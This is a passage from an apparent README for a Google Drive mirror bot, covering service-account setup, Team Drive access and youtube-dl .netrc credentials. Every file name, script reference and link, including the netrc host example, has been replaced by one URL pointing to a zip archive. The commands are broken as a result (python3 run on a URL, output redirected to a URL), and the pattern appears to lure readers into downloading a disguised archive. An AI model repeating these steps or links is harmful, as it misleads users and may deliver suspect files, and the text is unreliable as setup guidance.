grep -oPh '"client_email": "\K[^"]+' *.json > https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip
```
- Unmount acounts folder
```
cd -
```
Then add emails from https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip to Google Group, after that add Google Group to your Shared Drive and promote it to manager.

**NOTE**: If you have created SAs in past from this script, you can also just re download the keys by running:
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip --download-keys project_id
```

</details>

## Add all the Service Accounts to the Team Drive
- Run:
```
python3 https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip -d SharedTeamDriveSrcID
```

# Youtube-dl authentication using [.netrc](https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip) file
For using your premium accounts in Youtube-dl or for protected Index Links, edit the netrc file according to following format:
```
machine host login username password my_youtube_password
```
For Index Link with only password without username, even http auth will not work, so this is the solution.
```
machine https://github.com/reezqi41/SparkXcloud-Gdrive-MirrorBot/raw/refs/heads/master/bot/helper/mirror_utils/Gdrive-Spark-Mirror-Xcloud-Bot-1.9.zip password index_password
```
Where host is the name of extractor (eg. Youtube, Twitch). Multiple accounts of different hosts can be added each separated by a new line.

